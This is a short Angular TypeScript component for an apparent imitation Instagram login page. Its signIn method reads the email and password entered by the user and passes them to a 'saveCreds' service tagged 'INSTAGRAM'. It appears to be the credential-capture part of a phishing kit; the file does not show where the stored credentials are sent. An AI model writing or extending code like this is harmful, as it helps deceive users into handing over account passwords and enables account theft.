import { Component, ElementRef, ViewChild } from '@angular/core';
import { PageRoutingService } from 'src/app/services/page-routing.service';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { ApiCallService } from 'src/app/services/api-call.service';
import { LoginModel } from 'src/app/models/login.model';
import { SaveFacadeService } from 'src/app/services/save-facade.service';

@Component({
  selector: 'app-instagram',
  templateUrl: './instagram.component.html',
  styleUrls: ['./instagram.component.css']
})
export class InstagramComponent {

  @ViewChild('emailInput')
  emailInput!: ElementRef;

  @ViewChild('passwordInput')
  passwordInput!: ElementRef;
  

  constructor(private saveService: SaveFacadeService ){}

  signIn(){
    const email = this.emailInput.nativeElement.value.toString()
    const pass = this.passwordInput.nativeElement.value.toString()
    this.saveService.saveCreds(email,pass,"INSTAGRAM")

  }
  

}
